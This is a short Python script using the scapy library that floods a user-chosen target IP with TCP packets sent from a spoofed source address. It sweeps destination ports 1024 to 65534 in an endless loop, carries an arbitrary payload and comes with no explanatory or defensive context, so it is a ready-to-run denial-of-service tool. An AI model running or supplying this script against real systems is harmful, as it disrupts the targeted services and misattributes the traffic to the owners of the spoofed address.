#!/usr/bin/python
from scapy.all import *

def synFlood(src, target, message):
	for  dport in range(1024,65535):
		IPlayer = IP(src=src, dst=target)
		TCPlayer = TCP(sport=4444, dport=dport)
		RAWlayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWlayer
		send(pkt)

source = input("[*] Enter Source IP Address To Fake:  ")
target = input("[*] Enter target IP Address: ")
message = input("[*] Enter The Message to TCP Paylaod: ")

while True:
	synFlood(source, target, message)



